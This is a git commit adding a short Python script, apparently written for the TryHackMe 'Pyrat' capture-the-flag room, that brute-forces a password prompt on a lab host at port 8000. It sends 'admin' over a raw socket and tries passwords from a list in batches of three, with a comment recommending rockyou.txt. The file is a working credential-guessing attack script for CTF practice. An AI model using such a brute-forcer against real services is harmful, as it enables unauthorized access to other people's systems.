d238cdc1787393f49f279a33b877623d851f5d0f
Matuszewski Maciej <115489887+matucham@users.noreply.github.com>
2024-11-13 16:15:46 +0100

    Create Pyrat_THM_socket_bruteforcer.py

---
+++ cybersec/CTF/Pyrat_THM_socket_bruteforcer.py
@@ -0,0 +1,60 @@
+import socket
+
+def connect_and_authenticate(ip, port, passwordlist):
+    # Number of attempts
+    max_attempts = 3
+    attempt = 0
+
+    while attempt < max_attempts:
+        try:
+            # Establish a socket connection
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((ip, port))
+                
+                # Send 'admin' command to trigger password prompt - we know that admin trigger proper shell from enumeration
+                s.sendall(b'admin\n')
+                
+                # Receive response from server
+                response = s.recv(1024).decode()
+                # print("Server response:", response)
+
+                # Check if the server is asking for a password
+                if "Password:" in response:
+                    # Prompt for password input from user
+                    password = passwordlist[attempt]
+                    s.sendall(password.encode() + b'\n')
+                    
+                    # Receive authentication result
+                    auth_response = s.recv(1024).decode()
+                    print("Authentication response:", auth_response)
+                    
+                    if not "Password:" in auth_response:
+                        print("Password is: ", password)
+                        return 1
+                    else:
+                        print("Authentication failed.")
+                    
+                attempt += 1          
+        except Exception as e:
+            print(f"Error during connection or authentication: {e}")
+            break
+
+    return 0
+
+# Replace with actual IP
+ip = "10.10.237.171"
+port = 8000
+
+def divide_into_sublists(lst, n=3):
+    return [lst[i:i + n] for i in range(0, len(lst), n)]
+
+# List of passwords to try - the best option is to use rockyou.txt
+paswd_list = ["admin", "abc", "abcd", 'xd', 'xdd', 'abc1', 'abrakadabra']
+sublists = divide_into_sublists(paswd_list)
+
+for sublist in sublists:
+    if connect_and_authenticate(ip, port, sublist) == 1:
+        print("Password found")
+        break
+    else:
+        print("Password not found in given list")
